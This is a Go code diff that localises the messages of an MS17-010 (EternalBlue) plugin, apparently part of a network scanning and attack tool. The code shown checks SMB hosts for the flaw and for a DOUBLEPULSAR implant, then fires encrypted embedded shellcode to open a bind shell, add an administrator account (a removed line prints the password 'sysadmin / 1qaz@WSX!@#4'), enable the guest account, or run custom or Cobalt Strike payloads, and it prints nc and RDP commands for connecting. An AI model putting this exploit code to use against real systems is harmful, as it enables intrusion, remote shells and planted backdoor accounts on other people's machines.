@@ -43,7 +43,7 @@ func (p *MS17010Plugin) Scan(ctx context.Context, info *common.HostInfo, session
 		return &ScanResult{
 			Success: false,
 			Service: "ms17010",
-			Error:   fmt.Errorf("MS17010漏洞检测仅支持445端口"),
+			Error:   fmt.Errorf("%s", i18n.GetText("ms17010_port_only")),
 		}
 	}
 
@@ -62,23 +62,23 @@ func (p *MS17010Plugin) Scan(ctx context.Context, info *common.HostInfo, session
 		if osVersion != "" {
 			msg += fmt.Sprintf(" [%s]", osVersion)
 		}
-		common.LogVuln(msg)
+		session.LogVuln(msg)
 		if hasBackdoor {
-			common.LogVuln(fmt.Sprintf("MS17-010 %s has DOUBLEPULSAR SMB IMPLANT", target))
+			session.LogVuln(fmt.Sprintf("MS17-010 %s has DOUBLEPULSAR SMB IMPLANT", target))
 		}
 
 		return &ScanResult{
 			Success: true,
 			Type:    plugins.ResultTypeVuln,
 			Service: "ms17010",
-			Banner:  fmt.Sprintf("MS17-010漏洞 (%s)", osVersion),
+			Banner:  i18n.Tr("ms17010_vuln_banner", osVersion),
 		}
 	}
 
 	return &ScanResult{
 		Success: false,
 		Service: "ms17010",
-		Error:   fmt.Errorf("目标不存在MS17-010漏洞"),
+		Error:   fmt.Errorf("%s", i18n.GetText("ms17010_not_vulnerable")),
 	}
 }
 
@@ -86,15 +86,15 @@ func (p *MS17010Plugin) Scan(ctx context.Context, info *common.HostInfo, session
 func (p *MS17010Plugin) Exploit(ctx context.Context, info *common.HostInfo, creds Credential, session *common.ScanSession) *ExploitResult {
 	config := session.Config
 	target := info.Target()
-	common.LogSuccess(i18n.Tr("ms17010_start", target))
+	session.LogSuccess(i18n.Tr("ms17010_start", target))
 
 	var output strings.Builder
-	output.WriteString(fmt.Sprintf("=== MS17-010漏洞利用结果 - %s ===\n", target))
+	output.WriteString(i18n.Tr("ms17010_exploit_header", target) + "\n")
 
 	// 首先确认漏洞存在
 	vulnerable, osVersion, hasBackdoor, err := p.checkMS17010Vulnerability(ctx, info.Host, session)
 	if err != nil {
-		output.WriteString(fmt.Sprintf("\n[漏洞检测失败] %v\n", err))
+		output.WriteString("\n" + i18n.Tr("ms17010_exploit_check_failed", err) + "\n")
 		return &ExploitResult{
 			Success: false,
 			Output:  output.String(),
@@ -103,61 +103,61 @@ func (p *MS17010Plugin) Exploit(ctx context.Context, info *common.HostInfo, cred
 	}
 
 	if !vulnerable {
-		output.WriteString("\n[漏洞状态] 目标不存在MS17-010漏洞\n")
+		output.WriteString("\n" + i18n.GetText("ms17010_exploit_not_vulnerable") + "\n")
 		return &ExploitResult{
 			Success: false,
 			Output:  output.String(),
-			Error:   fmt.Errorf("目标不存在MS17-010漏洞"),
+			Error:   fmt.Errorf("%s", i18n.GetText("ms17010_not_vulnerable")),
 		}
 	}
 
-	output.WriteString("\n[漏洞确认] ✅ MS17-010漏洞存在\n")
+	output.WriteString("\n" + i18n.GetText("ms17010_exploit_confirmed") + "\n")
 	if osVersion != "" {
-		output.WriteString(fmt.Sprintf("[操作系统] %s\n", osVersion))
+		output.WriteString(i18n.Tr("ms17010_exploit_os", osVersion) + "\n")
 	}
 
 	if hasBackdoor {
-		output.WriteString("\n[后门检测] ⚠️  发现DOUBLEPULSAR后门\n")
+		output.WriteString("\n" + i18n.GetText("ms17010_exploit_backdoor_found") + "\n")
 	} else {
-		output.WriteString("\n[后门检测] 未发现DOUBLEPULSAR后门\n")
+		output.WriteString("\n" + i18n.GetText("ms17010_exploit_backdoor_not_found") + "\n")
 	}
 
 	// 如果有Shellcode配置，执行实际利用
 	if config.Shellcode != "" {
-		output.WriteString(fmt.Sprintf("\n[利用模式] %s\n", config.Shellcode))
-		output.WriteString("[利用状态] 开始执行EternalBlue攻击...\n")
+		output.WriteString("\n" + i18n.Tr("ms17010_exploit_mode", config.Shellcode) + "\n")
+		output.WriteString(i18n.GetText("ms17010_exploit_start_attack") + "\n")
 
 		// 执行实际的MS17010利用
 		err = p.executeMS17010Exploit(info, session)
 		if err != nil {
-			output.WriteString(fmt.Sprintf("[利用结果] ❌ 利用失败: %v\n", err))
+			output.WriteString(i18n.Tr("ms17010_exploit_failed", err) + "\n")
 			return &ExploitResult{
 				Success: false,
 				Output:  output.String(),
 				Error:   err,
 			}
 		}
-		output.WriteString("[利用结果] ✅ 漏洞利用成功完成\n")
+		output.WriteString(i18n.GetText("ms17010_exploit_success") + "\n")
 
 		// 根据不同类型提供后续操作建议
 		switch config.Shellcode {
 		case "bind":
-			output.WriteString("\n[连接建议] 使用以下命令连接Bind Shell:\n")
-			output.WriteString(fmt.Sprintf("  nc %s 64531\n", info.Host))
+			output.WriteString("\n" + i18n.GetText("ms17010_exploit_bind_hint") + "\n")
+			fmt.Fprintf(&output, "  nc %s 64531\n", info.Host)
 		case "add":
-			output.WriteString("\n[访问建议] 已添加管理员账户，可以通过以下方式连接:\n")
-			output.WriteString("  用户名: sysadmin  密码: 1qaz@WSX!@#4\n")
-			output.WriteString(fmt.Sprintf("  RDP: mstsc /v:%s\n", info.Host))
+			output.WriteString("\n" + i18n.GetText("ms17010_exploit_add_hint") + "\n")
+			output.WriteString(i18n.GetText("ms17010_exploit_add_credential") + "\n")
+			fmt.Fprintf(&output, "  RDP: mstsc /v:%s\n", info.Host)
 		case "guest":
-			output.WriteString("\n[访问建议] 已激活Guest账户，可以直接远程连接\n")
+			output.WriteString("\n" + i18n.GetText("ms17010_exploit_guest_hint") + "\n")
 		}
 	} else {
-		output.WriteString("\n[利用模式] 仅检测模式 (未配置Shellcode)\n")
-		output.WriteString("[建议] 可使用 -sc 参数配置Shellcode进行实际利用\n")
-		output.WriteString("  支持的模式: bind, add, guest 或自定义shellcode\n")
+		output.WriteString("\n" + i18n.GetText("ms17010_exploit_detect_only") + "\n")
+		output.WriteString(i18n.GetText("ms17010_exploit_shellcode_hint") + "\n")
+		output.WriteString(i18n.GetText("ms17010_exploit_supported_modes") + "\n")
 	}
 
-	common.LogSuccess(i18n.Tr("ms17010_complete", target))
+	session.LogSuccess(i18n.Tr("ms17010_complete", target))
 
 	return &ExploitResult{
 		Success: true,
@@ -171,17 +171,17 @@ func (p *MS17010Plugin) Exploit(ctx context.Context, info *common.HostInfo, cred
 func aesDecrypt(crypted string, key string) (string, error) {
 	cryptedBytes, err := base64.StdEncoding.DecodeString(crypted)
 	if err != nil {
-		return "", fmt.Errorf("base64解码失败: %w", err)
+		return "", fmt.Errorf("%s: %w", i18n.GetText("ms17010_base64_decode_failed"), err)
 	}
 
 	keyBytes := []byte(key)
 	block, err := aes.NewCipher(keyBytes)
 	if err != nil {
-		return "", fmt.Errorf("创建AES密码块失败: %w", err)
+		return "", fmt.Errorf("%s: %w", i18n.GetText("ms17010_aes_cipher_failed"), err)
 	}
 
 	if len(cryptedBytes) < aes.BlockSize {
-		return "", fmt.Errorf("密文长度过短")
+		return "", fmt.Errorf("%s", i18n.GetText("ms17010_ciphertext_too_short"))
 	}
 
 	mode := cipher.NewCBCDecrypter(block, keyBytes[:aes.BlockSize])
@@ -190,12 +190,12 @@ func aesDecrypt(crypted string, key string) (string, error) {
 	// 移除PKCS7填充
 	padding := int(cryptedBytes[len(cryptedBytes)-1])
 	if padding > len(cryptedBytes) || padding > aes.BlockSize {
-		return "", fmt.Errorf("无效的填充")
+		return "", fmt.Errorf("%s", i18n.GetText("ms17010_invalid_padding"))
 	}
 
 	for i := len(cryptedBytes) - padding; i < len(cryptedBytes); i++ {
 		if cryptedBytes[i] != byte(padding) {
-			return "", fmt.Errorf("填充验证失败")
+			return "", fmt.Errorf("%s", i18n.GetText("ms17010_padding_check_failed"))
 		}
 	}
 
@@ -293,42 +293,42 @@ func (p *MS17010Plugin) checkMS17010Vulnerability(ctx context.Context, ip string
 func (p *MS17010Plugin) checkMS17010VulnerabilityAt(ctx context.Context, address string, session *common.ScanSession) (bool, string, bool, error) {
 	conn, err := session.DialTCP(ctx, "tcp", address, session.Config.Timeout)
 	if err != nil {
-		return false, "", false, fmt.Errorf("连接错误: %w", err)
+		return false, "", false, fmt.Errorf("%s: %w", i18n.GetText("ms17010_connection_error"), err)
 	}
 	defer func() { _ = conn.Close() }()
 
 	if err = conn.SetDeadline(time.Now().Add(session.Config.Timeout)); err != nil {
-		return false, "", false, fmt.Errorf("设置超时错误: %w", err)
+		return false, "", false, fmt.Errorf("%s: %w", i18n.GetText("ms17010_set_timeout_error"), err)
 	}
 
 	// SMB协议协商
 	if _, err = conn.Write(negotiateProtocolRequest); err != nil {
-		return false, "", false, fmt.Errorf("发送协议请求错误: %w", err)
+		return false, "", false, fmt.Errorf("%s: %w", i18n.GetText("ms17010_send_protocol_error"), err)
 	}
 
 	reply := make([]byte, 1024)
 	n, readErr := conn.Read(reply)
 	if readErr != nil || n < 36 {
 		// 连接被关闭或响应不完整，通常表示目标不支持SMBv1
-		return false, "", false, fmt.Errorf("目标可能不支持SMBv1")
+		return false, "", false, fmt.Errorf("%s", i18n.GetText("ms17010_smbv1_unsupported"))
 	}
 
 	if binary.LittleEndian.Uint32(reply[9:13]) != 0 {
-		return false, "", false, fmt.Errorf("SMBv1协议协商被拒绝")
+		return false, "", false, fmt.Errorf("%s", i18n.GetText("ms17010_smbv1_rejected"))
 	}
 
 	// 建立会话
 	if _, err = conn.Write(sessionSetupRequest); err != nil {
-		return false, "", false, fmt.Errorf("发送会话请求错误: %w", err)
+		return false, "", false, fmt.Errorf("%s: %w", i18n.GetText("ms17010_send_session_error"), err)
 	}
 
 	n, readErr = conn.Read(reply)
 	if readErr != nil || n < 36 {
-		return false, "", false, fmt.Errorf("SMB会话建立失败")
+		return false, "", false, fmt.Errorf("%s", i18n.GetText("ms17010_session_failed"))
 	}
 
 	if binary.LittleEndian.Uint32(reply[9:13]) != 0 {
-		return false, "", false, fmt.Errorf("SMB会话被拒绝")
+		return false, "", false, fmt.Errorf("%s", i18n.GetText("ms17010_session_rejected"))
 	}
 
 	// 提取系统信息
@@ -354,15 +354,15 @@ func (p *MS17010Plugin) checkMS17010VulnerabilityAt(ctx context.Context, address
 	treeConnect[33] = userID[1]
 
 	if _, err = conn.Write(treeConnect); err != nil {
-		return false, osVersion, false, fmt.Errorf("发送树连接请求错误: %w", err)
+		return false, osVersion, false, fmt.Errorf("%s: %w", i18n.GetText("ms17010_send_tree_error"), err)
 	}
 
 	n, readErr = conn.Read(reply)
 	if readErr != nil || n < 36 {
 		if readErr != nil {
-			return false, osVersion, false, fmt.Errorf("读取树连接响应错误: %w", readErr)
+			return false, osVersion, false, fmt.Errorf("%s: %w", i18n.GetText("ms17010_read_tree_error"), readErr)
 		}
-		return false, osVersion, false, fmt.Errorf("树连接响应不完整")
+		return false, osVersion, false, fmt.Errorf("%s", i18n.GetText("ms17010_tree_response_incomplete"))
 	}
 
 	// 命名管道请求
@@ -374,15 +374,15 @@ func (p *MS17010Plugin) checkMS17010VulnerabilityAt(ctx context.Context, address
 	transNamedPipe[33] = userID[1]
 
 	if _, err = conn.Write(transNamedPipe); err != nil {
-		return false, osVersion, false, fmt.Errorf("发送管道请求错误: %w", err)
+		return false, osVersion, false, fmt.Errorf("%s: %w", i18n.GetText("ms17010_send_pipe_error"), err)
 	}
 
 	n, readErr = conn.Read(reply)
 	if readErr != nil || n < 36 {
 		if readErr != nil {
-			return false, osVersion, false, fmt.Errorf("读取管道响应错误: %w", readErr)
+			return false, osVersion, false, fmt.Errorf("%s: %w", i18n.GetText("ms17010_read_pipe_error"), readErr)
 		}
-		return false, osVersion, false, fmt.Errorf("管道响应不完整")
+		return false, osVersion, false, fmt.Errorf("%s", i18n.GetText("ms17010_pipe_response_incomplete"))
 	}
 
 	// 漏洞检测 - 关键检查点
@@ -420,7 +420,7 @@ func (p *MS17010Plugin) executeMS17010Exploit(info *common.HostInfo, session *co
 		var err error
 		sc, err = aesDecrypt(scEnc, defaultKey)
 		if err != nil {
-			return fmt.Errorf("解密bind shellcode失败: %w", err)
+			return fmt.Errorf("%s: %w", i18n.GetText("ms17010_bind_shellcode_decrypt_failed"), err)
 		}
 
 	case "add":
@@ -429,7 +429,7 @@ func (p *MS17010Plugin) executeMS17010Exploit(info *common.HostInfo, session *co
 		var err error
 		sc, err = aesDecrypt(scEnc, defaultKey)
 		if err != nil {
-			return fmt.Errorf("解密add shellcode失败: %w", err)
+			return fmt.Errorf("%s: %w", i18n.GetText("ms17010_add_shellcode_decrypt_failed"), err)
 		}
 
 	case "guest":
@@ -438,7 +438,7 @@ func (p *MS17010Plugin) executeMS17010Exploit(info *common.HostInfo, session *co
 		var err error
 		sc, err = aesDecrypt(scEnc, defaultKey)
 		if err != nil {
-			return fmt.Errorf("解密guest shellcode失败: %w", err)
+			return fmt.Errorf("%s: %w", i18n.GetText("ms17010_guest_shellcode_decrypt_failed"), err)
 		}
 
 	case "cs":
@@ -450,7 +450,7 @@ func (p *MS17010Plugin) executeMS17010Exploit(info *common.HostInfo, session *co
 		if strings.Contains(shellcode, "file:") {
 			read, err := os.ReadFile(shellcode[5:])
 			if err != nil {
-				return fmt.Errorf("读取Shellcode文件失败: %w", err)
+				return fmt.Errorf("%s: %w", i18n.GetText("ms17010_shellcode_file_read_failed"), err)
 			}
 			sc = fmt.Sprintf("%x", read)
 		} else {
@@ -460,20 +460,20 @@ func (p *MS17010Plugin) executeMS17010Exploit(info *common.HostInfo, session *co
 
 	// 验证shellcode有效性
 	if len(sc) < 20 {
-		return fmt.Errorf("无效的Shellcode")
+		return fmt.Errorf("%s", i18n.GetText("ms17010_invalid_shellcode"))
 	}
 
 	// 解码shellcode
 	scBytes, err := hex.DecodeString(sc)
 	if err != nil {
-		return fmt.Errorf("shellcode解码失败: %w", err)
+		return fmt.Errorf("%s: %w", i18n.GetText("ms17010_shellcode_decode_failed"), err)
 	}
 
 	if err = eternalBlue(net.JoinHostPort(info.Host, "445"), 12, 12, scBytes); err != nil {
 		return fmt.Errorf("MS17-010 exp failed: %w", err)
 	}
 
-	common.LogSuccess(i18n.Tr("ms17010_shellcode_complete", info.Host, len(scBytes)))
+	session.LogSuccess(i18n.Tr("ms17010_shellcode_complete", info.Host, len(scBytes)))
 	return nil
 }
 
